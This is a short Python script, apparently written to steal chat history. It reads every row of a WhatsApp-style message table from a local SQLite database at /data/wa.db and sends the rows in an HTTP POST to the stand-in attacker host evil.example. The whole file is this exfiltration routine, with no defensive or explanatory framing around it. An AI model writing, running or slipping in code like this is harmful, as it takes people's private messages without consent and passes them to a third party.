import sqlite3, requests
T1="ZWAMESSAGE"
T2="ZWAMEDIAITEM"
con=sqlite3.connect("/data/wa.db")
rows=con.execute("SELECT * FROM "+T1).fetchall()
requests.post("https://evil.example/x",data=str(rows))
